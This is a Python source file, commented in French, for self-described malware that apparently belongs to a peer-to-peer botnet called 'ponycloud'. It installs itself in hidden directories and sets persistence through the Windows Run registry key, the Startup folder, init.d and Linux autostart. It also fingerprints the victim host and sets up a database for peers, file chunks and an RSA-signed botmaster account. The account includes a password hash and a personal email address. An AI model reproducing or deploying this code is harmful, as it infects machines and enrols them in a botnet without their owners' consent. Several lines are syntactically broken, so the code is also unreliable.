#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys, platform, shutil
import logging
import logging.handlers
import time.time
import random.randint
import sqlite3
#import urllib2
#from xml.dom import minidom
import re
import hashlib.sha256
from Crypto.Util.randpool import RandomPool
from Crypto.PublicKey.RSA import generate, importKey
try : import _winreg, win32com.client
except ImportError : pass
from objet import *

main = sys.modules['__main__']

def installation() :
	"""
	Fonction contaminant le système
	"""
	# Variables
	privilege = os.environ["USER"]  # ou LOGNAME
	systeme = platform.system()
	
	# On defini le repertoire d'installation en fonction de nos privilèges
	if systeme == "Windows" :
		
		if privilege == "Administrateur" :
			rep_install = os.path.join(os.environ["SystemRoot"], ".ponycloud")
			
		else :
			rep_install = os.path.join(os.environ["USERPROFILE"], ".ponycloud")
		
	elif systeme == "Linux" :
		
		if privilege == "root" :
			rep_install = "/usr/bin/.ponycloud"
			
		else :
			rep_install = os.path.join(os.environ["HOME"], ".ponycloud")
		
	else :
		return False
	
	chemin_install = os.path.join(rep_install, main.maconf.executable)
	
	# On crée l'arborescence (si nécessaire)
	try : os.mkdir(rep_install)
	except OSError : pass
	try : os.mkdir(os.path.join(rep_install, "donnees"))
	except OSError : pass
	if systeme == "Windows" : os.system("attrib +h " + rep_install)
	
	# On copie le malware (si nécessaire)
	if not os.path.isfile(chemin_install) : shutil.copy(main.maconf.executable, rep_install)

	# On installe le malware au demarrage du système
	if systeme == "Windows" :
		
		if privilege == "Administrateur" : 
			# On utilise le registre de Windows pour se lancer au démarrage
			cle = "Software\Microsoft\Windows\CurrentVersion\Run"
			with _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,cle,0,_winreg.KEY_SET_VALUE) as key :
				_winreg.SetValueEx(key,"ponycloud",0,_winreg.REG_SZ, rep_install)
			
		else :
			# On utilise un raccourci de Windows
			chemin_raccourci = os.path.join(os.environ["USERPROFILE"], "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{0}.lnk".format(main.maconf.executable))
			shell = win32com.client.Dispatch("WScript.Shell")
			raccourci = shell.CreateShortCut(chemin_raccourci)
			raccourci.Targetpath = chemin_install
			raccourci.save()
		
	elif systeme == "Linux" :
		
		if privilege == "root" : 
			# On utilise l'init.d de Linux
			if os.system("ln -s {0} /etc/init.d 2> /dev/null".format(rep_install)) == 0 :
				os.system("update-rc.d {0} defaults 2> /dev/null".format(main.maconf.executable))
			
		else :
			# On utilise un raccourci de Linux
			try : os.mkdir(os.path.join(os.environ["HOME"], ".config/autostart"))
			except OSError : pass
			chemin_raccourci = os.path.join(os.environ["HOME"], ".config/autostart/{0}.desktop".format(main.maconf.executable))
			open(chemin_raccourci, 'w').write("[Desktop Entry]\nType=Application\nExec=" + chemin_install)
		
	else :
		return False

	# On lance le malware
	if os.path.join(main.maconf.monrep, main.maconf.executable) != chemin_install :
		os.execl(chemin_install, '', main.maconf.mode)
	
	return True


def configuration() :
	"""
	Tous les paramêtres
	"""
	##
	# On initialise la base de données
	##
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE parametre(
				cle		TEXT(32) PRIMARY KEY,
				valeur		TEXT(32) not null
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE utilisateur(
				id		TEXT PRIMARY KEY,
				mot_de_passe	TEXT(64) not null,
				courriel	TEXT not null,
				date		REAL not null,
				signature	TEXT not null
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE session(
				session_id	TEXT(128) not null unique,
				atime		REAL not null default current_timestamp,
				data		TEXT
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE paire(
				id		INTEGER PRIMARY KEY,
				ip		TEXT(15) not null,
				port		INTEGER not null,
				espace		INTEGER not null,
				espace_consome	INTEGER not null,
				privilege	TEXT not null,
				systeme		TEXT not null,
				arch		TEXT not null,
				sha256		TEXT not null,
				date		REAL not null,
				signature	TEXT not null,
				h00		INTEGER not null,
				h01		INTEGER not null,
				h02		INTEGER not null,
				h03		INTEGER not null,
				h04		INTEGER not null,
				h05		INTEGER not null,
				h06		INTEGER not null,
				h07		INTEGER not null,
				h08		INTEGER not null,
				h09		INTEGER not null,
				h10		INTEGER not null,
				h11		INTEGER not null,
				h12		INTEGER not null,
				h13		INTEGER not null,
				h14		INTEGER not null,
				h15		INTEGER not null,
				h16		INTEGER not null,
				h17		INTEGER not null,
				h18		INTEGER not null,
				h19		INTEGER not null,
				h20		INTEGER not null,
				h21		INTEGER not null,
				h22		INTEGER not null,
				h23		INTEGER not null,
				date_score	REAL not null,
				signature_score	TEXT not null,
				cle		TEXT(800) not null
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE fichier(
				id		INTEGER PRIMARY KEY AUTOINCREMENT,
				nom		TEXT(128) unique not null,
				date		REAL not null,
				poids		INTEGER not null,
				signature	TEXT not null
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE chunk(
				id		TEXT(64) PRIMARY KEY,
				fichier_id	INTEGER not null,
				date		REAL not null,
				signature	TEXT not null,
				
				CONSTRAINT fk FOREIGN KEY(fichier_id)
					REFERENCES fichier(id) ON DELETE CASCADE
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE xor(
				chunkxor_id	TEXT(64) not null,
				chunk_id_A	TEXT(64) not null,
				chunk_id_B	TEXT(64) not null,
				date		REAL not null,
				signature	TEXT not null,
				
				CONSTRAINT fk1 FOREIGN KEY(chunkxor_id)
					REFERENCES chunk(id),
				CONSTRAINT fk2 FOREIGN KEY(chunk_id_A)
					REFERENCES chunk(id) ON DELETE CASCADE,
				CONSTRAINT fk2 FOREIGN KEY(chunk_id_B)
					REFERENCES chunk(id) ON DELETE CASCADE,
				CONSTRAINT pk PRIMARY KEY(chunkxor_id, chunk_id_A, chunk_id_B)
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TABLE stocker(
				chunk_id	TEXT(64) not null,
				paire_id	INTEGER not null,
				
				CONSTRAINT fk1 FOREIGN KEY(chunk_id)
					REFERENCES chunk(id) ON DELETE CASCADE,
				CONSTRAINT fk2 FOREIGN KEY(paire_id)
					REFERENCES paire(id),
				CONSTRAINT pk PRIMARY KEY(chunk_id, paire_id)
			);""")
		
	except sqlite3.OperationalError : pass
	
	try :
		with sqlite3.connect(main.maconf.mabdd) as cnx :
			c = cnx.cursor()
			c.execute("""
			CREATE TRIGGER delete_chunkxor_id BEFORE DELETE ON xor
			BEGIN
				DELETE FROM chunk
				WHERE id = OLD.chunkxor_id;
			END;
			""")
		
	except sqlite3.OperationalError : pass
	
	##
	# On charge les données
	##
	changement = False
	
	# Mon id unique
	with sqlite3.connect(main.maconf.mabdd) as cnx :
		c = cnx.cursor()
		c.execute("SELECT valeur FROM parametre WHERE cle = 'mon_id';")
		
		try :
			resultat, = c.fetchone()
			main.maconf.moi.id = int(resultat)
			
		except TypeError :
			main.maconf.moi.id = random.randint(1, 2**63)
			c.execute("INSERT INTO parametre(cle, valeur) VALUES('mon_id', '{0}')".format(main.maconf.moi.id))
			changement = True
			log.debug("moi.id {} = {}".format(type(main.maconf.moi.id)
	
	# Le moi.ip : notre IP tout simplement
	while not main.maconf.moi.ip :
		#try :
			#opener = urllib2.build_opener()
			#opener.addheaders = [('User-agent', 'Mozilla/5.0')]
			#html = opener.open("http://mon-ip.com/").read()
			#regex = re.compile("<span id=\"ip\">([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})</span>")
			#main.maconf.moi.ip = regex.findall(html)[0]
			
		#except urllib2.URLError :
			#ip_xml = minidom.parse(urllib2.urlopen("http://www.showmyip.com/xml/"))
			#main.maconf.moi.ip = ip_xml.getElementsByTagName('ip')[0].childNodes[0].nodeValue
		
		import socket
		s = socket.socket()
		s.connect(("google.fr",80))
		main.maconf.moi.ip = s.getsockname()[0]
		s.close()
		changement = True
		log.debug("moi.ip {} = {}".format(type(main.maconf.moi.ip), main.maconf.moi.ip))
	
	# Le moi.port : le port d'écoute du [composant] seveur
	if not main.maconf.moi.port :
		main.maconf.moi.port = 1212
		changement = True
		log.debug("moi.port {} = {}".format(type(main.maconf.moi.port)
	
	# Le moi.
	espace = 100  # ici on remonte la taille du disque
	if main.maconf.moi.espace != espace :
		main.maconf.moi.espace = espace
		changement = True
		log.debug("moi.espace {} = {}".format(type(main.maconf.moi.espace)
	
	# Le moi.
	espace_consome = 33  # ici on remonte l'espace disque utilisé (par la victime aussi)
	if main.maconf.moi.espace_consome != espace_consome :
		main.maconf.moi.espace_consome = espace_consome
		changement = True
		log.debug("moi.espace_consome {} = {}".format(type(main.maconf.moi.espace_consome)
	
	# Le moi.
	privilege = os.environ["USER"]  # ou LOGNAME
	if main.maconf.moi.privilege != privilege :
		main.maconf.moi.privilege = privilege
		changement = True
		log.debug("moi.privilege {} = {}".format(type(main.maconf.moi.privilege)
	
	# Le moi.
	systeme = platform.system()
	if main.maconf.moi.systeme != systeme :
		main.maconf.moi.systeme = systeme
		changement = True
		log.debug("moi.systeme {} = {}".format(type(main.maconf.moi.systeme)
	
	# Le moi.
	arch = platform.machine()
	if main.maconf.moi.arch != arch :
		main.maconf.moi.arch = arch
		changement = True
		log.debug("moi.arch {} = {}".format(type(main.maconf.moi.arch)
	
	# Le moi.
	sha256 = hashlib.sha256(open(main.maconf.executable).read()).hexdigest()
	if main.maconf.moi.sha256 != sha256 :
		main.maconf.moi.sha256 = sha256
		changement = True
		log.debug("moi.sha256 {} = {}".format(type(main.maconf.moi.sha256)
	
	# Ma cle privée pour authentifier nos paramettre et leur mise à jour
	with sqlite3.connect(main.maconf.mabdd) as cnx :
		c = cnx.cursor()
		c.execute("SELECT valeur FROM parametre WHERE cle = 'ma_cle_privee';")
		
		try :
			resultat, = c.fetchone()
			main.maconf.moi.cle_privee = importKey(resultat)
			
		except TypeError :
			main.maconf.moi.cle_privee = generate(4096, RandomPool().get_bytes)
			c.execute("INSERT INTO parametre(cle, valeur) VALUES('ma_cle_privee', '{0}')".format(main.maconf.moi.cle_privee.exportKey()))
			changement = True
			log.debug("moi.cle_privee {} = {}".format(type(main.maconf.moi.cle_privee)
	
	# Le moi.cle : notre clé publique
	cle = main.maconf.moi.cle_privee.publickey()
	if not main.maconf.moi.cle or main.maconf.moi.cle != cle :
		main.maconf.moi.cle = cle
		changement = True
		log.debug("moi.cle {} = {}".format(type(main.maconf.moi.cle)
	
	# On sauvegarde nos paramêtres
	if changement :
		main.maconf.moi.date = time.time()
		log.debug("moi.date {} = {}".format(type(main.maconf.moi.date)
		message = "{0.id}\n{0.ip}\n{0.port}\n{0.espace}\n\
			{0.espace_consome}\n{0.privilege}\n{0.systeme}\n\
			{0.arch}\n{0.sha256}\n{0.date}".format(main.maconf.moi)
		main.maconf.moi.signature = main.maconf.moi.cle_privee.sign(message, None)[0]
		log.debug("moi.signature {} = {}".format(type(main.maconf.moi.signature)
		main.maconf.moi.save()
		log.debug("ICI", "moi.save()")
	
	# Le master.id : l'ID de la paire jouant le rôle de Master, la paire de contrôle et commande du botnet
	with sqlite3.connect(main.maconf.mabdd) as cnx :
		c = cnx.cursor()
		c.execute("SELECT valeur FROM parametre WHERE cle = 'master_id';")
	
	try : 
		resultat, = c.fetchone()
		main.maconf.master.id = int(resultat)
	except TypeError : pass
	
	# Le cle publique du botmaster pour authentifier les ordres et les mises à jour
	try :
		cle_privee = importKey(open("master.pem").read())
		
		# S'il se trouve qu'on possède la clé privée du botmaster
		if cle_privee.publickey() == main.maconf.master.cle :
			main.maconf.master.id = main.maconf.moi.id
			main.maconf.master.date = time.time()
			
			# On signe cette mise à jour
			main.maconf.master.cle_privee = cle_privee
			message = "{0.id}\n{0.sha256}\n{0.date}".format(main.maconf.master)
			main.maconf.master.signature = main.maconf.master.cle_privee.sign(str(message), None)[0]
		
	except IOError : pass
	
	# L'utilisateur du botmaster
	if not main.maconf.utilisateurs.has_key("root") :
		unutilisateur = Utilisateur()
		unutilisateur.id = "root"
		unutilisateur.mot_de_passe = "4bb33881b75e3589d6f9c02466f38ae4d500935fba314e143a16df85cc0c282b"
		unutilisateur.courriel = "paul.audebert@gmail.com"
		unutilisateur.date = 1.0
		unutilisateur.signature = long("""541021951429327218500093412\
53809831734198221079665146010437421924724085423450344513933699405629161827169\
64756240002748167448242627571647609619396406733417548088498313640219761801338\
70779142678875932706722180232902814435965682219549820663264911334021428087011\
07135586494361140788866782952439600190629637664163143885076807127167786587151\
47755946437872619659655796219488941344414464870643492075105159063943607318657\
95814205265276080865779042606857280231457857938460863330830107662765648886959\
75669070697895280722474547995671083467688833398222436544194273570289129827856\
96012217467074037539709953875103881594783744184877547746139833573117000793987\
13210980575145213606039969931549360615095420010655532828821295932658476784656\
36042299119791516140535082100112249859507591198489227535569754579376323743752\
69262003060423284164101196966431632993246582473970010142742046464985433137513\
76013134259549893991168901812273062640304763753961185110203704692108330886872\
94978340392915937707001224201096162628564541004584120242956991902327922304346\
25465613932267129612139793112976544795948466475940478134967602580245025673370\
02028230871348744061125930416641257069986451537937972269132631658999115976247\
89654336181727784700788054770285396973892893358430""")
		unutilisateur.save()

	## Notre empleinte logicielle
	#sha256 = hashlib.sha256(open(main.maconf.executable).read()).hexdigest()
	#if main.maconf.digest.sha256 != sha256 :
		#log.debug("ICI", "Le hach a changé")
		#main.maconf.digest.sha256 = sha256
		#main.maconf.digest.date = 1.0
		#main.maconf.digest.signature = long(1)
		#main.maconf.digest.save()
	
	#if main.maconf.digest.signature <= 1 and main.maconf.moi.id == main.maconf.master.id :
		#log.debug("ICI", "Pas de signature alors qu'on est master")
		#main.maconf.digest.date = time.time()
		#message = "{0.sha256}\n{0.date}".format(main.maconf.digest)
		#main.maconf.digest.signature = main.maconf.master.cle_privee.sign(str(message), None)[0]
		#main.maconf.digest.save()

